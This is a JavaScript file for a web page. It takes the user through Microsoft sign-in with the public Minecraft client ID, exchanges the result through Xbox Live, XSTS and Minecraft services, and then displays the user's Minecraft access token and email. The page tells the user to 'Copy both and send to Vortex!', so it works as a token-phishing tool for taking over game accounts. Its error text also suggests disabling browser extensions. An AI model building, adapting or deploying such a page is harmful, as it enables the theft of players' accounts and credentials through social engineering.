const CLIENT_ID = '00000000402b5328'; // Public Minecraft client ID
const REDIRECT_URI = window.location.origin + '/';
const loginBtn = document.getElementById('loginBtn');
const output = document.getElementById('output');

async function handleCallback() {
  const params = new URLSearchParams(window.location.search);
  const code = params.get('code');
  if (!code) return;

  output.innerText = 'Fetching token...';
  try {
    // Step 1: Microsoft token
    const tokenResponse = await fetch('https://login.live.com/oauth20_token.srf', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: CLIENT_ID,
        code,
        grant_type: 'authorization_code',
        redirect_uri: REDIRECT_URI,
      }).toString(),
    });
    const tokenData = await tokenResponse.json();
    if (tokenData.error) throw new Error(tokenData.error_description);
    const accessToken = tokenData.access_token;

    // Step 2: Xbox Live
    const xboxResponse = await fetch('https://user.auth.xboxlive.com/user/authenticate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      body: JSON.stringify({
        Properties: {
          AuthMethod: 'RPS',
          SiteName: 'user.auth.xboxlive.com',
          RpsTicket: `t=${accessToken}`,
        },
        RelyingParty: 'http://auth.xboxlive.com',
        TokenType: 'JWT',
      }),
    });
    const xboxData = await xboxResponse.json();
    if (!xboxData.Token) throw new Error('Xbox Live auth failed');
    const xblToken = xboxData.Token;

    // Step 3: XSTS
    const xstsResponse = await fetch('https://xsts.auth.xboxlive.com/xsts/authorize', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      body: JSON.stringify({
        Properties: {
          SandboxId: 'RETAIL',
          UserTokens: [xblToken],
        },
        RelyingParty: 'rp://api.minecraftservices.com/',
        TokenType: 'JWT',
      }),
    });
    const xstsData = await xstsResponse.json();
    if (!xstsData.Token) throw new Error('XSTS auth failed');
    const xstsToken = xstsData.Token;
    const userHash = xstsData.DisplayClaims.xui[0].uhs;

    // Step 4: Minecraft token
    const mcResponse = await fetch('https://api.minecraftservices.com/authentication/login_with_xbox', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      body: JSON.stringify({
        identityToken: `XBL3.0 x=${userHash};${xstsToken}`,
      }),
    });
    const mcData = await mcResponse.json();
    if (!mcData.access_token) throw new Error('Minecraft token failed');
    const mcToken = mcData.access_token;

    // Try to get email
    const profileResponse = await fetch('https://api.minecraftservices.com/minecraft/profile', {
      headers: { Authorization: `Bearer ${mcToken}` },
    });
    const profileData = await profileResponse.json();
    const email = profileData.email || 'Unknown (send your Microsoft email)';

    output.innerText = `Email: ${email}\nToken: ${mcToken}\n\nCopy both and send to Vortex!`;
    window.history.replaceState({}, document.title, '/');
  } catch (err) {
    output.innerText = `Error: ${err.message}. Try incognito mode or disable crypto extensions.`;
    output.className = 'error';
  }
}

loginBtn.onclick = () => {
  output.innerText = 'Preparing login...';
  const authUrl = `https://login.live.com/oauth20_authorize.srf?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=XboxLive.signin%20XboxLive.offline_access`;
  window.location.href = authUrl;
};

if (window.location.search.includes('code=')) {
  handleCallback();
}
